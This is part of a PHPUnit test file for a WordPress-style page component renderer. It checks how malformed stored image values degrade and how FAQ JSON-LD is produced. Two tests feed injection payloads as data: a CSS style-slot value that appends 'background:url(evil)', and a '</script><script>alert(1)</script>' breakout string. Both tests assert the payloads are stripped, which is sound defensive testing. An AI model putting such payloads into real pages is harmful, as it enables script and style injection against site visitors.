     * purely stored data (restore/#233, pre-rule, raw meta).
     *
     * @dataProvider fatalNonScalars
     */
    public function testStoredNonScalarImageAltRendersAnEmptyAltInsteadOfFataling($bad): void
    {
        $html = $this->render('logos', [
            'items' => [['image_url' => 'https://example.com/logo.png', 'image_alt' => $bad]],
        ]);
        // The image still renders — a broken ALT is not a reason to drop the image.
        $this->assertStringContainsString(
            '<img src="https://example.com/logo.png" alt="" class="logos__image" loading="lazy">',
            $html,
            'the image renders with an empty alt'
        );

        foreach ([
            ['grid',         $this->gridProps(['items' => [['title' => 'C', 'image_url' => 'https://example.com/c.jpg', 'image_alt' => $bad]]]), 'grid__item-image'],
            ['testimonials', $this->testimonialsProps(['items' => [['quote' => 'Q', 'image_url' => 'https://example.com/f.jpg', 'image_alt' => $bad]]]), 'testimonials__avatar'],
            ['hero',         $this->heroProps(['layout' => 'split', 'image_url' => 'https://example.com/h.jpg', 'image_alt' => $bad]), 'hero__image'],
            ['section',      $this->sectionProps(['layout' => 'image-left', 'image_url' => 'https://example.com/s.jpg', 'image_alt' => $bad]), 'section__image'],
        ] as [$component, $props, $class]) {
            $out = $this->render($component, $props);
            $this->assertStringContainsString('alt=""', $out, "{$component}: empty alt");
            $this->assertStringContainsString('class="' . $class . '"', $out, "{$component}: the image still renders");
        }
    }

    // ── The UNCHANGED half: a non-string SCALAR still coerces, exactly as before ──

    /**
     * THE REGRESSION PIN, and the reason the guard is is_scalar and not is_string.
     *
     * create_page ACCEPTS `image_url: 42` and stores it raw, reporting nothing (#707).
     * pp_render_responsive_image() resolves $attachment_id BEFORE falling back to $url,
     * so such a page renders its image_id attachment correctly today. An is_string()
     * guard would blank $image_url, the truthiness gate would close, and FOUR of the
     * five components would silently drop a real, resolvable image — no error, no
     * finding, no log line. This pin fails the moment that predicate narrows.
     */
    public function testAScalarImageUrlStillResolvesItsImageIdAttachment(): void
    {
        $this->seedAttachment(77, 'https://example.com/uploads/REAL.jpg');

        foreach ([42, true, 3.14] as $scalar) {
            $label = var_export($scalar, true);

            $logos = $this->render('logos', [
                'items' => [['image_url' => $scalar, 'image_alt' => 'L', 'image_id' => 77]],
            ]);
            $this->assertStringContainsString('REAL.jpg', $logos, "logos {$label}");

            $grid = $this->render('grid', $this->gridProps([
                'items' => [['title' => 'C', 'image_url' => $scalar, 'image_id' => 77]],
            ]));
            $this->assertStringContainsString('REAL.jpg', $grid, "grid {$label}");

            $testimonials = $this->render('testimonials', $this->testimonialsProps([
                'items' => [['quote' => 'Q', 'image_url' => $scalar, 'image_id' => 77]],
            ]));
            $this->assertStringContainsString('REAL.jpg', $testimonials, "testimonials {$label}");

            $section = $this->render('section', $this->sectionProps([
                'layout' => 'image-left', 'image_url' => $scalar, 'image_id' => 77,
            ]));
            $this->assertStringContainsString('REAL.jpg', $section, "section {$label}");

            $hero = $this->render('hero', $this->heroProps([
                'layout' => 'split', 'image_url' => $scalar, 'image_id' => 77,
            ]));
            $this->assertStringContainsString('REAL.jpg', $hero, "hero {$label}");
        }
    }

    /**
     * And with no image_id, a scalar still coerces to its string form and paints the
     * same (broken, but VISIBLE and diagnosable) <img> it painted before the guard.
     * "No image" would be strictly less diagnosable than "broken image" here.
     */
    public function testAScalarImageUrlStillCoercesToItsStringForm(): void
    {
        // Pairs, not a keyed map: a float array key would be truncated to an int.
        foreach ([[42, '42'], [3.14, '3.14']] as [$scalar, $expected]) {
            $html = $this->render('logos', [
                'items' => [['image_url' => $scalar, 'image_alt' => 'L']],
            ]);
            $this->assertStringContainsString(
                '<img src="' . $expected . '" alt="L" class="logos__image" loading="lazy">',
                $html,
                "image_url {$expected} coerces exactly as it did before the guard"
            );
        }

        // true casts to "1" — the same string the typed parameter coerced it to before.
        $boolean = $this->render('logos', [
            'items' => [['image_url' => true, 'image_alt' => 'L']],
        ]);
        $this->assertStringContainsString('<img src="1" alt="L" class="logos__image" loading="lazy">', $boolean);

        // A scalar ALT coerces too, rather than being blanked.
        $alt = $this->render('logos', [
            'items' => [['image_url' => 'https://example.com/logo.png', 'image_alt' => 42]],
        ]);
        $this->assertStringContainsString('alt="42"', $alt);
    }

    /**
     * Falsy CONTROLS, not fix cases. None of these ever reached the typed call (the
     * truthiness gates closed first), so they render identically with and without the
     * guard. Pinned so the guard is not blamed for — or credited with — behavior that
     * predates it.
     */
    public function testFalsyImageUrlsKeepTheirPreExistingMeaning(): void
    {
        foreach ([[], false, null, '', '0'] as $falsy) {
            $label = json_encode($falsy);

            $logos = $this->render('logos', [
                'items' => [['image_url' => $falsy, 'image_alt' => 'L']],
            ]);
            $this->assertStringNotContainsString('<img ', $logos, "logos {$label}");

            $section = $this->render('section', $this->sectionProps([
                'layout' => 'image-left', 'image_url' => $falsy,
            ]));
            $this->assertStringNotContainsString('section__image-wrap', $section, "section {$label}");
        }
    }

    /**
     * The #584 contract that must SURVIVE the guard: on the item renderers image_id is a
     * COMPANION to a URL, never a replacement, so a NON-SCALAR image_url degrades the
     * whole image rather than silently swapping in the attachment. Hero is the
     * deliberate exception ($has_split_media counts a resolvable id as media on its
     * own), asserted alongside so the difference is recorded rather than discovered.
     *
     * Contrast with testAScalarImageUrlStillResolvesItsImageIdAttachment: a SCALAR keeps
     * the gate open and the attachment renders. That asymmetry is the point of the
     * predicate.
     */
    public function testANonScalarImageUrlDoesNotPromoteImageIdIntoASubstitute(): void
    {
        $this->seedAttachment(42, 'https://example.com/uploads/card.jpg');
        $bad = ['attachment_id' => 42];

        $logos = $this->render('logos', [
            'items' => [['image_url' => $bad, 'image_alt' => 'A', 'image_id' => 42]],
        ]);
        $this->assertStringNotContainsString('card.jpg', $logos, 'logos: no image at all');

        $grid = $this->render('grid', $this->gridProps([
            'items' => [['title' => 'Card', 'image_url' => $bad, 'image_id' => 42]],
        ]));
        $this->assertStringNotContainsString('card.jpg', $grid, 'grid: no image at all');

        $testimonials = $this->render('testimonials', $this->testimonialsProps([
            'items' => [['quote' => 'Q', 'image_url' => $bad, 'image_id' => 42]],
        ]));
        $this->assertStringNotContainsString('card.jpg', $testimonials, 'testimonials: no image at all');

        $section = $this->render('section', $this->sectionProps([
            'layout' => 'image-left', 'image_url' => $bad, 'image_id' => 42,
        ]));
        $this->assertStringNotContainsString('card.jpg', $section, 'section: the text-only fallback wins');

        $hero = $this->render('hero', $this->heroProps([
            'layout' => 'split', 'image_url' => $bad, 'image_id' => 42,
        ]));
        $this->assertStringContainsString('card.jpg', $hero, 'hero: a resolvable image_id is media on its own');
        $this->assertStringContainsString('hero--split', $hero, 'hero: so the split layout stands');
    }

    public function testAValidStringImageUrlIsUntouchedByTheGuard(): void
    {
        // The accept side. The guard must be a no-op on every real composition, so these
        // are byte-exact rather than "contains an img".
        $logos = $this->render('logos', [
            'items' => [['image_url' => 'https://example.com/logo.png', 'image_alt' => 'Logo']],
        ]);
        $this->assertStringContainsString(
            '<img src="https://example.com/logo.png" alt="Logo" class="logos__image" loading="lazy">',
            $logos
        );

        $grid = $this->render('grid', $this->gridProps([
            'items' => [['title' => 'Card', 'image_url' => 'https://example.com/card.jpg', 'image_alt' => 'Card banner']],
        ]));
        $this->assertStringContainsString(
            '<img src="https://example.com/card.jpg" alt="Card banner" class="grid__item-image" loading="lazy">',
            $grid
        );

        $testimonials = $this->render('testimonials', $this->testimonialsProps([
            'items' => [['quote' => 'Q', 'image_url' => 'https://example.com/face.jpg', 'image_alt' => 'Face']],
        ]));
        $this->assertStringContainsString(
            '<img src="https://example.com/face.jpg" alt="Face" class="testimonials__avatar" loading="lazy">',
            $testimonials
        );

        $hero = $this->render('hero', $this->heroProps([
            'layout' => 'split', 'image_url' => 'https://example.com/hero.jpg', 'image_alt' => 'Hero',
        ]));
        $this->assertStringContainsString(
            '<img src="https://example.com/hero.jpg" alt="Hero" class="hero__image" loading="eager">',
            $hero
        );
        $this->assertStringContainsString('hero--split', $hero, 'and the split layout is kept');

        $cover = $this->render('hero', $this->heroProps([
            'layout' => 'cover', 'image_url' => 'https://example.com/bg.jpg',
        ]));
        $this->assertStringContainsString('background-image:url(https://example.com/bg.jpg)', $cover);

        $section = $this->render('section', $this->sectionProps([
            'layout' => 'image-left', 'image_url' => 'https://example.com/side.jpg', 'image_alt' => 'Side',
        ]));
        $this->assertStringContainsString(
            '<img src="https://example.com/side.jpg" alt="Side" class="section__image" loading="lazy">',
            $section
        );
    }

    // ── Image focal point + aspect ratio style slots (#108) ──────────────────

    public function testHeroCoverBgPositionOverrideRenders(): void
    {
        $html = $this->render('hero', $this->heroProps([
            'layout' => 'cover', 'image_url' => 'https://example.com/bg.jpg',
            '__pp_style' => ['--hero-bg-position' => 'top left'],
        ]));
        $this->assertStringContainsString('--hero-bg-position: top left', $html);
    }

    public function testHeroImagePositionAndAspectRatioOverrideRenders(): void
    {
        $html = $this->render('hero', $this->heroProps([
            'layout' => 'split', 'image_url' => 'https://example.com/photo.jpg',
            '__pp_style' => ['--hero-image-position' => 'top', '--hero-image-aspect-ratio' => '16/9'],
        ]));
        $this->assertStringContainsString('--hero-image-position: top', $html);
        $this->assertStringContainsString('--hero-image-aspect-ratio: 16/9', $html);
    }

    public function testSectionImagePositionAndAspectRatioOverrideRenders(): void
    {
        $html = $this->render('section', $this->sectionProps([
            'layout' => 'image-left', 'image_url' => 'https://example.com/photo.jpg',
            '__pp_style' => ['--section-image-position' => 'bottom', '--section-image-aspect-ratio' => '1'],
        ]));
        $this->assertStringContainsString('--section-image-position: bottom', $html);
        $this->assertStringContainsString('--section-image-aspect-ratio: 1', $html);
    }

    public function testSectionBgPositionOverrideRenders(): void
    {
        $html = $this->render('section', $this->sectionProps(['background_image' => 'https://example.com/bg.jpg', '__pp_style' => ['--section-bg-position' => '20% 80%']]));
        $this->assertStringContainsString('--section-bg-position: 20% 80%', $html);
    }

    public function testCtaBgPositionOverrideRenders(): void
    {
        $html = $this->render('cta', $this->ctaProps(['background_image' => 'https://example.com/bg.jpg', '__pp_style' => ['--cta-bg-position' => 'right']]));
        $this->assertStringContainsString('--cta-bg-position: right', $html);
    }

    public function testStatsBgPositionOverrideRenders(): void
    {
        $html = $this->render('stats', $this->statsProps(['background_image' => 'https://example.com/bg.jpg', '__pp_style' => ['--stats-bg-position' => 'left']]));
        $this->assertStringContainsString('--stats-bg-position: left', $html);
    }

    public function testHeroImagePositionRejectsInjectionInStyleSlot(): void
    {
        $html = $this->render('hero', $this->heroProps([
            'layout' => 'split', 'image_url' => 'https://example.com/photo.jpg',
            '__pp_style' => ['--hero-image-position' => 'top; background:url(evil)'],
        ]));
        $this->assertStringNotContainsString('url(evil)', $html);
    }

    public function testHeroSchemaDeclaresPositionAndRatioSlotTypes(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/hero/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        $this->assertSame('position', $slots['--hero-image-position']['type']);
        $this->assertSame('ratio', $slots['--hero-image-aspect-ratio']['type']);
        $this->assertSame('position', $slots['--hero-bg-position']['type']);
    }

    public function testSectionCtaStatsSchemaDeclareBgPositionSlot(): void
    {
        foreach (['section' => '--section-bg-position', 'cta' => '--cta-bg-position', 'stats' => '--stats-bg-position'] as $component => $slot) {
            $schema = json_decode(file_get_contents(dirname(__DIR__) . "/components/{$component}/schema.json"), true);
            $this->assertSame('position', $schema['styling']['style_slots'][$slot]['type'], "{$component} must declare {$slot} as type position.");
        }
    }

    // ── pp_render_faq_schema() + FAQ JSON-LD (#3) ─────────────────────────────

    public function testRenderFaqSchemaProducesValidFaqPageJson(): void
    {
        $html = pp_render_faq_schema([
            ['question' => 'Does this require ACF?', 'answer' => 'No. pp_field() returns null when ACF is not installed.'],
        ]);
        $this->assertStringStartsWith('<script type="application/ld+json">', $html);
        $this->assertStringEndsWith("</script>\n", $html);

        preg_match('#<script type="application/ld\+json">(.*)</script>#s', $html, $m);
        $schema = json_decode($m[1], true);
        $this->assertSame('https://schema.org', $schema['@context']);
        $this->assertSame('FAQPage', $schema['@type']);
        $this->assertCount(1, $schema['mainEntity']);
        $this->assertSame('Question', $schema['mainEntity'][0]['@type']);
        $this->assertSame('Does this require ACF?', $schema['mainEntity'][0]['name']);
        $this->assertSame('Answer', $schema['mainEntity'][0]['acceptedAnswer']['@type']);
        $this->assertSame('No. pp_field() returns null when ACF is not installed.', $schema['mainEntity'][0]['acceptedAnswer']['text']);
    }

    public function testRenderFaqSchemaHandlesMultipleItems(): void
    {
        $html = pp_render_faq_schema([
            ['question' => 'Q1?', 'answer' => 'A1.'],
            ['question' => 'Q2?', 'answer' => 'A2.'],
        ]);
        preg_match('#<script type="application/ld\+json">(.*)</script>#s', $html, $m);
        $schema = json_decode($m[1], true);
        $this->assertCount(2, $schema['mainEntity']);
    }

    public function testRenderFaqSchemaStripsHtmlFromAnswer(): void
    {
        $html = pp_render_faq_schema([
            ['question' => 'Q?', 'answer' => '<p>Rich <strong>HTML</strong> answer.</p>'],
        ]);
        preg_match('#<script type="application/ld\+json">(.*)</script>#s', $html, $m);
        $schema = json_decode($m[1], true);
        $this->assertSame('Rich HTML answer.', $schema['mainEntity'][0]['acceptedAnswer']['text']);
    }

    public function testRenderFaqSchemaStripsScriptBreakoutAttemptFromAnswer(): void
    {
        // No well-formed tag markup -- including a </script> breakout
        // attempt -- can survive wp_strip_all_tags() into the JSON payload.
        // (The inert text between the tags, e.g. "alert(1)", is not a
        // security concern here: it's never interpreted as script, only
        // ever rendered as a plain JSON string value.)
        $html = pp_render_faq_schema([
            ['question' => 'Q?', 'answer' => 'Type </script><script>alert(1)</script> to escape.'],
        ]);
        $payload = substr($html, strlen('<script type="application/ld+json">'), -strlen("</script>\n"));
        $this->assertStringNotContainsString('</script>', $payload);
        $this->assertStringNotContainsString('<script>', $payload);
    }

    public function testJsonEncodeEscapesForwardSlashesAsSecondaryDefense(): void
    {
        // Documents the second, redundant layer pp_render_faq_schema() relies
        // on: wp_json_encode()'s default forward-slash escaping (this codebase
        // never passes JSON_UNESCAPED_SLASHES for JSON-LD). Verified directly
        // against wp_json_encode(), independent of wp_strip_all_tags() --
        // if a "</script>"-shaped substring ever reached json encoding some
        // other way, it still couldn't close the surrounding <script> tag.
        $encoded = wp_json_encode(['text' => 'a</script>b']);
        $this->assertStringNotContainsString('</script>', $encoded);
        $this->assertStringContainsString('<\/script>', $encoded);
    }

    public function testRenderFaqSchemaSkipsIncompleteItems(): void
    {
        $html = pp_render_faq_schema([
            ['question' => 'No answer'],
            ['answer' => 'No question'],
            ['question' => 'Complete?', 'answer' => 'Yes.'],
        ]);
        preg_match('#<script type="application/ld\+json">(.*)</script>#s', $html, $m);
        $schema = json_decode($m[1], true);
        $this->assertCount(1, $schema['mainEntity']);
        $this->assertSame('Complete?', $schema['mainEntity'][0]['name']);
    }

    public function testRenderFaqSchemaReturnsEmptyStringForNoCompleteItems(): void
    {
        $this->assertSame('', pp_render_faq_schema([]));
        $this->assertSame('', pp_render_faq_schema([['question' => 'Only a question']]));
    }

    public function testFaqComponentRendersJsonLdWhenItemsPresent(): void
    {
        $html = $this->render('faq', $this->faqProps());
        $this->assertStringContainsString('<script type="application/ld+json">', $html);
        $this->assertStringContainsString('"@type":"FAQPage"', $html);
    }

    public function testFaqComponentOmitsJsonLdWhenNoItems(): void
    {
        $html = $this->render('faq', ['title' => 'FAQ', 'items' => []]);
        $this->assertStringNotContainsString('application/ld+json', $html);
    }

    public function testFaqComponentPlacesJsonLdInsideSection(): void
    {
        // #432: the JSON-LD <script> must render INSIDE the faq <section>, not as
        // a trailing sibling after </section>. A script emitted after </section>
        // becomes the previous element sibling of the next band, so the
        // `main > [data-pp-component] + .band` adjacent-sibling rhythm misses that
        // band. Assert the script tag appears BEFORE the closing </section>.
        $html = $this->render('faq', $this->faqProps());

        $scriptPos = strpos($html, '<script type="application/ld+json">');
        $closePos  = strrpos($html, '</section>');
        $this->assertNotFalse($scriptPos, 'faq must emit the JSON-LD script when items are present.');
        $this->assertNotFalse($closePos, 'faq must render a closing </section>.');
        $this->assertLessThan(
            $closePos,
            $scriptPos,
            'JSON-LD <script> must be inside the <section> (before </section>), not a trailing sibling.'
        );

        // The section is the LAST element: nothing follows </section> except
        // trailing whitespace, so no non-component sibling can break the `+` rhythm.
        $this->assertSame('', trim(substr($html, $closePos + strlen('</section>'))),
            'Nothing may follow </section> — a trailing node breaks adjacent-sibling rhythm (#432).');

        // Schema content is unchanged by the move.
        preg_match('#<script type="application/ld\+json">(.*)</script>#s', $html, $m);
        $schema = json_decode($m[1], true);
        $this->assertSame('FAQPage', $schema['@type']);
        $this->assertSame('Q?', $schema['mainEntity'][0]['name']);
        $this->assertSame('A.', $schema['mainEntity'][0]['acceptedAnswer']['text']);
    }

    // ── #705: a stored non-scalar background_image must not fatal the page ────
    //
    // The #641 block above closed this defect class for image_url/image_alt through
    // pp_render_responsive_image(). This is the SAME class on the sibling prop, through
    // the other typed helper:
    //
    //   lib/wp.php  pp_esc_image_src(string $url, int $depth = 0)
    //     cta.php, stats.php, section.php — all three read `background_image` raw.
    //
    // Each is gated on truthiness, and a non-empty array is TRUTHY, so the gate passes
    // and the typed call raises a TypeError that no caller catches.
    // templates/composition.php calls pp_get_component() with no try/catch, so ONE
    // malformed stored value takes the WHOLE PUBLIC PAGE down with a 500. Catchable in
    // principle, deliberately not caught in practice — and adding a catch is not the
    // fix, because swallowing an escaping throw can leave core filters de-registered
    // for the rest of the request (#730). Guard BEFORE the call.
    //
    // WHY THE GUARD SITS AT THE READ. This prop drives THREE gates per component — the
    // --has-bg-image modifier, the inline background-image declaration, and the overlay
    // <div> — and the read is upstream of all three. A call-site-only guard would leave
    // the modifier and the overlay ON with nothing painting underneath: a dark scrim
    // over the band's own background, wearing the light on-overlay ink the modifier
    // selects. Guarding at the read instead reuses a state that shipped long ago, so the
    // assertions below are "renders exactly as an empty background_image does".
    //
    // WHY is_scalar AND NOT is_string. PHP runs COERCIVE here, so only NON-SCALARS ever
    // fataled: a stored `42` coerced and painted `background-image:url(42)`. create_page
    // ACCEPTS `background_image: 42` and stores it raw with no finding (#707), so an
    // is_string() guard would silently drop a value the front door had just accepted.
    // Stated honestly, ONE half of the #641 rationale does not carry over here:
    // background_image has no image_id companion (it is CSS background-image, not an
    // <img>), so there is no resolvable attachment for is_string() to discard. The
    // write-accepted-scalar half carries on its own. The pins below split the two halves:
    //
    //   NON-SCALAR  -> "" -> no background.  CHANGED: this is the fatal, now degraded.
    //   SCALAR      -> (string) cast.        UNCHANGED: as it rendered before the guard.
    //
    // Ratified at gate D-B as the family standard. Scope is this prop's three read sites.
    // The same defect through OTHER surfaces is tracked separately and is deliberately not
    // fixed here: #706 (title/title_accent) has since LANDED with its own guards and pins;
    // #708 (grid count()/pp_render_style_vars) and #730 (esc_url/wp_kses_post) remain open.
    //
    // Reachability is #641's exactly: the write path rejects a non-scalar, but the
    // validator gates WRITES. restore_composition reports without blocking (#233), a
    // composition authored before the rule still carries the value, and a raw
    // _pp_composition meta write is not gated at all. The end-to-end pin on real stored
    // bytes lives in tests/StoredBackgroundImageRenderGuardTest.php; these hold the
    // per-component shape.

    /**
     * The shapes that actually FATALED, and now degrade. Every one is a non-scalar and
     * NON-EMPTY, so it is truthy and genuinely opens the gate that reaches the typed
     * call — an empty array is falsy and never got there, so it would pass identically
     * with the guard removed and is not a case.
     */
    public static function fatalNonScalarBackgrounds(): array
    {
        return [
            'import_media envelope' => [['attachment_id' => 42, 'url' => '/bg.png']],
            'list'                  => [['/a.png', '/b.png']],
            'nested map'            => [['src' => ['url' => '/bg.png']]],
        ];
    }

    /**
     * All three components, one assertion set. The contract is identical on each: the
     * band still renders its own content, and every one of the three background gates
     * stays shut — no modifier class, no overlay div, no background-image declaration.
     *
     * The `Array` assertion is not redundant with the others. phpunit.xml sets
     * failOnWarning="false", and esc_html/esc_attr render a stored array as the literal
     * string `Array` plus an E_WARNING WITHOUT fataling. So a future "fix" that coerced
     * instead of degrading would leave every not-contains assertion above it green while
     * painting `url(Array)` into the page. This is the pin that catches that.
     *
     * @dataProvider fatalNonScalarBackgrounds
     */
    public function testStoredNonScalarBackgroundImageRendersTheBandWithoutABackground($bad): void
    {
        foreach ([
            ['cta',     $this->ctaProps(['title' => 'Cta band', 'background_image' => $bad]), 'cta',     'Cta band'],
            ['stats',   $this->statsProps(['background_image' => $bad]),   'stats',   '40+'],
            ['section', $this->sectionProps(['background_image' => $bad]), 'section', '<p>Body</p>'],
        ] as [$component, $props, $prefix, $content]) {
            $html = $this->render($component, $props);

            // The band is there, with its own content — this is the whole point.
            $this->assertStringContainsString('data-pp-component="' . $component . '"', $html, "{$component}: the band renders");
            $this->assertStringContainsString($content, $html, "{$component}: the band keeps its content");

            // And all three background gates stayed shut.
            $this->assertStringNotContainsString('background-image', $html, "{$component}: no background-image declaration");
            $this->assertStringNotContainsString($prefix . '--has-bg-image', $html, "{$component}: no background-image modifier");
            $this->assertStringNotContainsString($prefix . '__overlay', $html, "{$component}: no overlay div");
            $this->assertStringNotContainsString('Array', $html, "{$component}: the value is degraded, never coerced");
        }
    }

    // ── The UNCHANGED half: a non-string SCALAR still paints, exactly as before ──

    /**
     * THE REGRESSION PIN, and the reason the guard is is_scalar and not is_string.
     *
     * create_page ACCEPTS `background_image: 42` and stores it raw, reporting nothing
     * (#707), and in coercive mode that value has always painted `url(42)`. An
     * is_string() guard would blank it, close all three gates, and silently drop a
     * background the front door had just accepted. This pin fails the moment the
     * predicate narrows.
     *
     * SCHEME-AGNOSTIC ON PURPOSE. The obvious assertion here would be the literal
     * `background-image:url(42)`, and it would be WRONG about production. Core's
     * esc_url() prepends a scheme to any value with no ':' and no leading /#?
     * (wp-includes/formatting.php, `$url = $scheme . $url`), so a real visitor gets
     * `url(http://42)`. The PHPUnit stub is type-faithful, not byte-faithful — it does
     * not reproduce that character work, and tests/EscapingStubContractTest.php pins the
     * stubs to exactly that contract. Asserting the stub's bytes would quietly enshrine
     * them as production behaviour, so the regex tolerates the scheme either way and the
     * assertion says only what this guard actually controls: the scalar survives to the
     * escaper and still paints.
     *
     * FOR #707: this pins COMPATIBILITY, not correctness. Painting a bare number is what
     * an accepted value does today; it is not a contract #707 must preserve. Updating
     * this pin when the write path tightens is the expected move, not a regression.
     */
    public function testAScalarBackgroundImageStillPaintsExactlyAsBefore(): void
    {
        foreach ([42, true, 3.14] as $scalar) {
            $label   = var_export($scalar, true);
            $pattern = '#background-image:url\((?:https?://)?' . preg_quote((string) $scalar, '#') . '\)#';

            foreach ([
                ['cta',     $this->ctaProps(['background_image' => $scalar]),     'cta'],
                ['stats',   $this->statsProps(['background_image' => $scalar]),   'stats'],
                ['section', $this->sectionProps(['background_image' => $scalar]), 'section'],
            ] as [$component, $props, $prefix]) {
                $html = $this->render($component, $props);
                $this->assertMatchesRegularExpression($pattern, $html, "{$component} {$label}: the scalar still paints");
                $this->assertStringContainsString($prefix . '--has-bg-image', $html, "{$component} {$label}: modifier still set");
                $this->assertStringContainsString($prefix . '__overlay', $html, "{$component} {$label}: overlay still rendered");
            }
        }
    }

    /**
     * The accept side on an ordinary value: a real URL emits the exact style attribute
     * it always has. A guard that quietly dropped legitimate backgrounds would pass
     * every negative test above.
     */
    public function testAnOrdinaryBackgroundImageUrlIsUnchanged(): void
    {
        foreach ([
            ['cta',     $this->ctaProps(['background_image' => 'https://example.com/bg.jpg']),     'cta'],
            ['stats',   $this->statsProps(['background_image' => 'https://example.com/bg.jpg']),   'stats'],
            ['section', $this->sectionProps(['background_image' => 'https://example.com/bg.jpg']), 'section'],
        ] as [$component, $props, $prefix]) {
            $html = $this->render($component, $props);
            $this->assertStringContainsString(
                'style="background-image:url(https://example.com/bg.jpg);"',
                $html,
                "{$component}: the exact style attribute"
            );
            $this->assertStringContainsString($prefix . '--has-bg-image', $html, "{$component}: modifier");
            $this->assertStringContainsString('<div class="' . $prefix . '__overlay" aria-hidden="true"></div>', $html, "{$component}: overlay");
        }
    }

    /**
     * The falsy-scalar controls. These never reached the typed call (the gate was
     * already shut) and must keep rendering no background — the (string) cast must not
     * OPEN a gate that used to be closed. `0` is the one worth having: `(string) 0` is
     * `"0"`, which is itself falsy in PHP, which is the only reason this holds.
     *
     * -0.0 is deliberately NOT in this list. It is the one scalar where the cast DOES
     * open the gates, and it has its own pin below.
     */
    public function testAFalsyScalarBackgroundImageStillRendersNoBackground(): void
    {
        foreach ([0, 0.0, false, '', '0'] as $falsy) {
            $label = var_export($falsy, true);
            foreach ([
                ['cta',     $this->ctaProps(['background_image' => $falsy]),     'cta'],
                ['stats',   $this->statsProps(['background_image' => $falsy]),   'stats'],
                ['section', $this->sectionProps(['background_image' => $falsy]), 'section'],
            ] as [$component, $props, $prefix]) {
                $html = $this->render($component, $props);
                // Anchor the negatives to a band that actually rendered — otherwise this
                // whole test would stay green against a component that emitted nothing.
                $this->assertStringContainsString('data-pp-component="' . $component . '"', $html, "{$component} {$label}: the band renders");
                $this->assertStringNotContainsString('background-image', $html, "{$component} {$label}: no background");
                $this->assertStringNotContainsString($prefix . '--has-bg-image', $html, "{$component} {$label}: no modifier");
                $this->assertStringNotContainsString($prefix . '__overlay', $html, "{$component} {$label}: no overlay");
            }
        }
    }

    /**
     * THE PARITY PIN, and the honest exception to it.
     *
     * The guard's safety argument is that `(string)` casting a scalar cannot change
     * WHICH of the three background gates fire — otherwise a value that rendered plain
     * before would start painting a scrim after. That holds for every scalar except one,
     * and the exception is measured here rather than reasoned about, because a review
     * caught the original claim overstating it.
     *
     * FLOAT NEGATIVE ZERO is the exception: `-0.0` is falsy, but `(string) -0.0` is
     * `'-0'`, and the only falsy strings in PHP are `''` and `'0'`. So a stored `-0.0`
     * opens gates that used to be shut. Accepted, not fixed: the value still routes
     * through pp_esc_image_src(), `-0` is inert in the CSS url() token, and
     * special-casing it would mean inspecting and rewriting the stored value, which the
     * D-B ruling forbids. Integer `-0` is NOT affected — PHP has no negative integer
     * zero, so `-0` parses as plain `0`.
     *
     * Swept across ALL THREE guarded components, not just cta: each carries its own copy
     * of the two-line guard, so a future divergence in stats or section would be
     * invisible to a cta-only sweep. The marker asserted is the `--has-bg-image`
     * modifier rather than the emitted URL, which keeps this independent of how faithful
     * the esc_url() stub is to core's character work.
     *
     * REACHABILITY of the -0.0 flip is pinned separately, in
     * StoredBackgroundImageRenderGuardTest::testNegativeZeroFlipsTheGateOnlyThroughARawMetaWrite —
     * it does NOT survive a JSON round-trip, so the normal write path cannot produce it.
     * This test is the renderer-level half.
     */
    public function testTheStringCastFlipsTheGateOnlyForNegativeZero(): void
    {
        $scalars = [0, 0.0, -0, false, true, 42, 3.14, -1, '', '0', '0.0', '+0', 'x', '00', NAN, INF, -INF];

        $components = [
            ['cta',     fn($v) => $this->ctaProps(['background_image' => $v]),     'cta'],
            ['stats',   fn($v) => $this->statsProps(['background_image' => $v]),   'stats'],
            ['section', fn($v) => $this->sectionProps(['background_image' => $v]), 'section'],
        ];

        foreach ($scalars as $scalar) {
            $label     = var_export($scalar, true);
            $rawTruthy = (bool) $scalar;

            foreach ($components as [$component, $propsFor, $prefix]) {
                $html    = $this->render($component, $propsFor($scalar));
                $painted = str_contains($html, $prefix . '--has-bg-image');

                $this->assertSame(
                    $rawTruthy,
                    $painted,
                    "{$component} {$label}: the (string) cast must not change whether the band paints a background"
                );
            }
        }

        // The single exception, asserted head-on so it can never drift silently.
        $this->assertFalse((bool) -0.0, 'float negative zero is falsy');
        $this->assertTrue((bool) (string) -0.0, "...but its string cast '-0' is truthy");

        foreach ($components as [$component, $propsFor, $prefix]) {
            $html = $this->render($component, $propsFor(-0.0));
            $this->assertStringContainsString($prefix . '--has-bg-image', $html, "{$component}: -0.0 opens the modifier gate");
            $this->assertStringContainsString($prefix . '__overlay', $html, "{$component}: -0.0 opens the overlay gate");
            $this->assertMatchesRegularExpression('#background-image:url\((?:https?://)?-0\)#', $html, "{$component}: -0.0 paints, where before the guard it did not");
        }
    }
}
